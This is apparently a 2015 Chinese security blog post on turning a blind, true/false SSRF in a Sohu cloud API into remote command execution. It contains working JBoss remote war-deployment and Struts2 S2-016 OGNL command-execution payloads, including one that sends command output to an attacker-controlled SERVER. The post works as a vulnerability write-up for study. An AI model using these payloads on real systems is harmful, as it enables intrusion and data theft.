### Bool型SSRF的思考与实践

	0x00 Bool型SSRF 
	0x01 SSRF利用的基本思路
	0x02 两者之间的区别
	0x03 Bool型SSRF利用方法
	0x04 Struts2在Bool型SSRF中的利用
	0x05 Other(想到什么写什么)

#### 0x00 Bool型SSRF
什么是Bool型SSRF, 没听说过. 其实我也没有听说过. 只是我也不知道该怎么描述就起了这样一个名称.

Bool型SSRF: 简单来说就是仅返回True 或 False的SSRF. 就以我前两天我挖掘的一个搜狐SSRF为例, 只有服务器端正确响应HTTP请求并且只有响应码为200的时候, 返回Success，其余全部返回Failed. 这就是一个典型的Bool型SSRF.

#### 0x01 SSRF利用的基本思路
Wooyun上有很多SSRF典型的案例, 可以说让人拍案惊奇. 但是没有一个关于BOOL型SSRF的利用案例(可能我没看到吧). 这次挖掘到一个搜狐的Bool型SSRF, 对于我这个只是简单理解SSRF原理没有任何实战的渣渣来说, 难度还真大. 不过想想, 以前没有接触过SSRF, 这次就把你玩透. 翻阅学习Wooyun上的案例, 了解SSRF利用的基本思路:

	内网探测 -> 应用识别 -> 攻击Payload -> Payload Result

1. 内网探测: 内网主机信息收集
2. 应用识别: 主机应用识别(可以通过Barner和应用指纹进行识别)
3. 攻击Payload: 根据应用识别的应用,加载不同的攻击Payload(最常用莫属于Struts2)
4. Payload Result: 返回相应Payload的执行信息

#### 0x02 两者之间的区别
BOOL型SSRF与一般的SSRF的区别在步骤二应用识别, 步骤三攻击Payload和步骤四Payload Result. 一般的SSRF在应用识别阶段返回的信息相对较多, 比如Banner信息, HTTP Title信息,更有甚的会将整个HTTP的Reponse完全返回, 而Bool型SSRF的却永远只有True or False. 因为没有任何Response信息, 所以对于攻击Payload的选择也是有很多限制的, 不能选择需要和Response信息交互的Payload. 在此次搜狐SSRF的中, 我分别使用了JBOSS远程调用和Struts2 S2-016远程命令执行. 对于Bool型SSRF, 我们不能说Payload打过去就一定成功执行, 就算是返回True, 也不能保证Payload一定执行成功. 所以我们要验证Payload的执行状态信息.

#### 0x03 Bool型SSRF利用方法
**应用识别**

	{ 指纹1 + 指纹2 + 黑指纹 }

以JBOSS为例: { /jmx-console/ + /invoker/JMXInvokerServlet + /d2z341.d#211 }

指纹1 和 指纹2 为应用识别指纹, 准确率越高越好. 黑指纹其实就是不会匹配任何应用的指纹，一般用较长的字符串代替即可. 分别用指纹1, 指纹2 和 黑指纹对内网主机探测统计, 获取三个主机列表: jmx-console.host(A)    invoker.host(B)    black.host(C). 

Host = (A∩B) –(A∩B∩C) 即剔除jmx-console.host 和 invoker.host中存在于black.host的主机, 然后对jmx-console和invoker.host的主机取交集.

**攻击Payload**

针对不用的应用我们需要加载不同的Payload, 但是大多数的攻击都是需要和Payload Result进行交互的. 这类Payload是没有办法用在此处的, 我们需要的是不需要和Payload Result进行交互的Payload. 我可以想到的两种应用比较广泛的Payload有JBOSS和Struts2漏洞.

JBoss Payload:

`/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system%3Aservice%3DMainDeployer&methodIndex=3&arg0=http%3A%2F%2F192.168.1.2%2Fzecmd.war`

通过JBOSS HtmlAdaptor接口直接部署远程war包, 我们可以通过access.log去验证war包是否成功部署.下面就是通过SSRF去执行不同的命令.还有一种方式,就是我们可以通过我们服务器的access.log日志获取到远程服务器对应的公网IP, 有时也会有一些意外惊喜.

Struts2 Payload:

`/action?action:%25{%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'command'})).start()}`

Struts2漏洞的影响大家都懂的, 通过URL直接远程命令执行, 想打那里就打那里.

**Payload Result**

获取Payload Result是十分有必要的, 这里的Payload Result和非Bool型SSRF的Result不是一个意思. 对于Bool型SSRF, 服务器端返回的数据永远只有True和False, 我们是可以通过返回的True或者False来判断Payload的执行状态, 但是这样的判断标准是无法让人信服的. 能否有一种方法能够精确的判断Payload的执行状态,而且能够返回Payload Result. 对于Struts2我找到了一种可利用的方法.

#### 0x04 Struts2在Bool型SSRF中的利用
下面是S2-016的POC:

	/action.action:%25{3*4}
	/action.action?redirect:%25{3*4}

通过对连个POC的理解, 我们知道下面的POC中的redirect是实现URL跳转, 通过URL跳转来验证S2-016漏洞.
![struts2-redirect](_static/imgs/33129003-7a337fe6-cfc9-11e7-9d64-5e25b0858af8.png)

当然也可以通过 "?redirect:http://www.baidu.com" 来验证. 那么我们是否可以通过 "?redirect:http://SERVER/%25{3*4}" 将%25{3*4}的执行结果作为SERVER的URL的一部分发送到远端服务器, 通过实验我们证实了这样的想法.
![struts2-redirect-to-remote](_static/imgs/33129024-90b83522-cfc9-11e7-8af5-5aeb397ebf82.png)

下面我们尝试S2-016的命令执行POC,执行结果如下:

`?redirect:%25{%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'command'})).start()}`

![struts2-exec](_static/imgs/33129041-a217523a-cfc9-11e7-9fee-1f18769136e8.png)

特此说明一下, 这里返回java.lang.ProcessImpl@xxxxxx表示命令执行成功, 将命令执行的结果通过redirect跳转输出到远程服务器.

`?redirect:http//SERVER/%25{%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'whoami'})).start()}`

![struts2-remote-exec](_static/imgs/33129051-aa994508-cfc9-11e7-8ffe-bb43718722dc.png)

由服务器端Access日志可以看出, 命令执行成功

![struts2-access-log](_static/imgs/33129059-af382ac0-cfc9-11e7-9b54-8efa741f2fbf.png)

其实通过上面的这种方式,我们已经完全能够准确的判断Payload Result的执行状态, 但是这不是我要的, 我想要Payload Result执行结果. 

带回显的POC:

`?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'whoami'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}`

![struts2-ssrf](_static/imgs/33129068-b43f43c8-cfc9-11e7-86f4-468637f2c3b9.png)

将命令执行结果Redirect到远程:

![struts2-ssrf2](_static/imgs/33129075-b8258a74-cfc9-11e7-8ce7-c3b7030709b3.png)

我们可以看到本地浏览器可以打印出结果,但是远程Access.log不会有任何日志. 对Java懂一点点的人都知道(比如我,对Java略懂一点点), 这里的POC的作用就是本地打印,所以肯定是不行的. 下一步我们就需要更改POC , 因为对Java不熟, 为此花费了大半天的时间,写下下面的POC:

`?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'command'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://SERVER/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}`

SERVER是我们的HTTP服务器IP地址, 我们获取命令执行结果,然后把他作为一个URL参数发送到远程SERVER上, 所以我们可以在远程SERVER的access.log看到命令的执行结果.

![struts2-ssrf3](_static/imgs/33129034-99dae1e0-cfc9-11e7-9764-66395cc3e101.png)

远程服务器日志:

![struts2-ssrf4](_static/imgs/33129036-9d9f4334-cfc9-11e7-886b-d6691b09329c.png)

至此, 我们完成了从一个BOOL型的SSRF转换为一个普通的SSRF,我们可以获取到任何Payload的执行结果, 我只能说这是一个质的飞跃.

说明: 对于文中浏览器中执行的返回信息,我们仅仅是在做测试,对于BOOL型SSRF这些信息对我们是不可见的, 我们能看到的仅仅是Server端的access.log日志.

#### 0x05 Other(想到什么写什么)
Bool型SSRF的其他利用方式-反射性XSS也是一种可利用的思路,不过挖掘的难度相对较大

此文是对搜狐SSRF漏洞利用过程中的一些思考,实践和总结.

这可以说是我的SSRF处女洞, 和此文章关联的漏洞”搜狐某云服务API接口导致SSRF/手工盲打到Struts2命令执行” http://wooyun.org/bugs/wooyun-2015-0129588 , 因为抱着学习的态度, 漏洞报告写的非常详细,而且有很多技巧在文章中没有提及. 当然也有很多YY的想法, 想拍砖的就来拍砖吧.

原文发布于乌云Drops, 留此纪念一下吧.

By Sep0lkit   2015.08.04